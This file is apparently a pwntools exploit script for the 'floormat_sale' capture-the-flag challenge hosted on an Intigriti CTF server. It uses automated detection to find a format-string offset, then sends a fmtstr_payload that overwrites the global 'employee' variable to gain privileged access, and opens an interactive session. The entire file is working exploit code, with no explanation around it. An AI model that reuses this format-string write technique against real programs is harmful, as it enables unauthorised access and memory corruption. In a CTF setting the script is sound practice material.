import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './floormat_sale'

### ------------------ EXPLOIT ------------------ ###

context.arch = 'x86-64'

def get_offset():
    # return 10
    def ef(payload):
        r = Pwn(PROG)
        log.info("payload = %s" % repr(payload))
        r.sla(b'choice:', b'6')
        r.sla(b'address:', payload)
        r.ru(b'shipped to:\n\n')
        res = r.prog.recv()
        r.prog.close()
        print(res)
        return res
    autofmt = FmtStr(ef)
    return autofmt.offset

r = Pwn(PROG, conn='floormatsale.ctf.intigriti.io 1339')

# Write over global var employee to get access
pay = fmtstr_payload(get_offset(), {r.sym['employee']:  0x1})

r.sla(b'choice:', b'6')
r.sla(b'address:', pay)

r.interactive()